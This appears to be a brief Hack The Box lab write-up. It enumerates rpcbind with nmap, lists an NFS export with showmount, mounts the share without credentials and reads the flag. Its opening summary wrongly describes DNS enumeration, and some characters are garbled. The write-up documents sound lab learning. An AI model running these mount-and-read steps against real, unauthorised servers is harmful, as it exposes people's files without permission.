## Summary
Perform DNS enumeration against the inlanefreight.htb domain to discover all published hostnames, IPs, and delegated sub‚Äêzones, then identify next steps for network and service discovery.
---

## Reconnaissance & Enumeration
Port scan & RPC discovery
```bash
sudo nmap -p111 -sV -sC 10.129.42.178

    Port 111/tcp open ‚Üí rpcbind

    NSE rpcinfo reveals an NFS export (program 100003)
```
List available NFS exports
```bash
showmount -e 10.129.42.178

    Export list for 10.129.42.178:
```

/nfsshare 10.129.0.0/16

- Share name: `/nfsshare`  
- Exported to the internal network  

---

## Exploitation

**Create a mount point**  
```bash
mkdir -p ./target-NFS
```

Mount the NFS share
```bash
sudo mount -t nfs 10.129.42.178:/nfsshare ./target-NFS/ -o nolock
```
 -o nolock avoids locking RPC calls if lockd isn‚Äôt available

List and read the flag
```bash
    ls ./target-NFS/
    # flag.txt

    cat ./target-NFS/flag.txt
    # HTB{nfs_exposed_flag_txt}
```

## Takeaways & Lessons Learned
An easy CTF but I learned the basics of footprinting NFS services. 

- Always enumerate RPC services with rpcinfo and showmount after finding rpcbind.

- nolock option is useful when the server‚Äôs lock daemon isn‚Äôt responding.

- Quick wins: mounting NFS shares can yield immediate file access without credentials.
